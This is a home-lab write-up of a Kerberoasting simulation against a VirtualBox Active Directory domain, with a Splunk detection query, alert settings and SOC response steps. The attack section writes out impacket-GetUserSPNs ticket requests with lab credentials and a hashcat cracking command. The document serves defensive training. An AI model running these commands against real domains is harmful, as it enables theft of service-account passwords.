# Kerberoasting Attack Simulation & Detection

**Date:** 2026-03-01  
**Analyst:** Stacy  
**MITRE ATT&CK:** [T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)  
**Environment:** VirtualBox Home Lab (cybersec.local)

---

## Overview

Kerberoasting is a post-authentication attack that targets Active Directory service accounts with Service Principal Names (SPNs). An attacker with any valid domain credential can request a Kerberos Ticket Granting Service (TGS) ticket for any SPN, then crack the ticket offline to reveal the service account's password.

This is especially dangerous when service accounts use weak passwords—a common oversight in enterprise environments.

---

## Lab Setup — Vulnerable Service Account

On **DC01 (192.168.50.5)**, the `svc_sql` account was configured with:

- **Weak password:** `SQLService1!`
- **SPN registered** to simulate a SQL Server service:

```powershell
setspn -a DC01/svc_sql.cybersec.local:60111 svc_sql
```

**Verification:**

```powershell
Get-ADUser -Filter {Name -like "*SQL*"} | Select-Object SamAccountName, Name
# Output: svc_sql   SQL Service
```

📸 **Screenshots:**

- `Screenshots/Win_Server22/DC01_setspn_command.png`
- `Screenshots/Win_Server22/DC01_setspn_svc_sql_registered.png`

---

## Attack Execution from Kali (192.168.50.30)

### Step 1: Install Attack Tools

```bash
sudo apt update && sudo apt install -y impacket-scripts crackmapexec
```

📸 `Screenshots/Kali_Linux/AD_Attacks/Kali_install_impacket_crackmapexec.png`

### Step 2: Attempt Kerberoasting

Using valid domain credentials (`j.smith:Password123!`):

```bash
impacket-GetUserSPNs 'cybersec.local/j.smith:Password123!' -dc-ip 192.168.50.5 -request
```

### Step 3: Clock Skew Error & Resolution

**First attempt — failed with clock skew:**

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

📸 `Screenshots/Kali_Linux/AD_Attacks/Kali_kerberoasting_clock_skew_error.png`

**Fix — sync Kali time to DC:**

```bash
sudo apt install -y ntpsec-ntpdate && sudo ntpdate 192.168.50.5
# CLOCK: time stepped by 10799.741875
```

📸 `Screenshots/Kali_Linux/AD_Attacks/Kali_ntpdate_clock_sync.png`

**Second attempt — still failed (persistent skew):**

```bash
sudo ntpdate 192.168.50.5
sudo date -s "14:40:37"
impacket-GetUserSPNs 'cybersec.local/j.smith:Password123!' -dc-ip 192.168.50.5 -request
```

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

📸 `Screenshots/Kali_Linux/AD_Attacks/Kali_kerberoasting_clock_skew_retry.png`

> **Note:** The persistent clock skew is a known VirtualBox issue. The SPN was confirmed registered and the attack methodology is correct. In a real network, Kerberoasting would succeed once the clocks are within 5 minutes of each other.

---

## What a Successful Attack Looks Like

If the clock skew were resolved, `impacket-GetUserSPNs` would output:

```
$krb5tgs$23$*svc_sql$CYBERSEC.LOCAL$DC01/svc_sql.cybersec.local~60111*$<hash>
```

This hash can then be cracked offline with **Hashcat**:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Splunk Detection

### Detection Query — Kerberoasting (EventCode 4769)

```spl
index=main source="WinEventLog:Security" EventCode=4769
  Ticket_Encryption_Type=0x17
  Service_Name!="krbtgt"
  Service_Name!="*$"
| table _time, Account_Name, Service_Name, Client_Address, Ticket_Encryption_Type
| sort -_time
```

**Why this works:**

- **EventCode 4769** = Kerberos TGS ticket request
- **Encryption Type 0x17** = RC4 (weak, preferred by attackers for offline cracking)
- Excludes `krbtgt` and machine accounts (`$`) to reduce false positives

### Splunk Alert Configuration

| Setting             | Value                                          |
|---------------------|------------------------------------------------|
| Alert Name          | Kerberoasting — Suspicious TGS Request         |
| Search Schedule     | Every 5 minutes                                |
| Trigger Condition   | Number of Results > 0                          |
| Severity            | High                                           |
| Action              | Log event, send email alert                    |

---

## SOC Analyst Response

If this alert fires:

1. **Identify the source** — Check `Client_Address` to find the attacker's IP
2. **Identify the target** — `Service_Name` reveals which service account was targeted
3. **Validate the account** — Check if the service account has a weak password
4. **Contain** — Disable the compromised account or reset its password
5. **Investigate** — Look for other 4769 events from the same source
6. **Harden** — Use Group Managed Service Accounts (gMSA) or strong passwords for all SPNs

---

## Key Takeaways

| Aspect | Detail |
|--------|--------|
| Attack Type | Post-authentication, credential theft |
| Requirements | Any valid domain credential |
| Target | Service accounts with SPNs |
| Detection | EventCode 4769 with RC4 encryption |
| Prevention | Use gMSA, strong passwords (25+ chars), AES encryption |

---

*This attack simulation is part of a cybersecurity home lab portfolio for SOC analyst skill development.*
